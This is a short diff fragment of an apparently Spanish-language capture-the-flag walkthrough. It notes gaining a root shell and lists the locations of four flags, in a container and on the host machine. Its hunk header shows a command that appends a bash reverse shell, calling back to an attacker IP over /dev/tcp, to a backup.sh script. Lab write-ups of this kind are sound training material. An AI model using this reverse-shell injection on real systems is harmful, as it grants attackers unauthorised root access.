@@ -259,7 +259,13 @@ $echo "bash -c 'bash -i >& /dev/tcp/10.18.101.123/123 0>&1'" >> backup.sh
 - Después de unos minutos en escucha, bbtenemos ahora sí una shell como `root` en la máquina víctima real y podremos leer las `4 flags` que hay en el sistema:
 
 Flag 1: `/var/www/html`
+
+
 Flag 2: `/var/www`
+
+
 Flag 3: `/root`  (contenedor)
+
+
 Flag 4: `/root` (Máquina real)
 
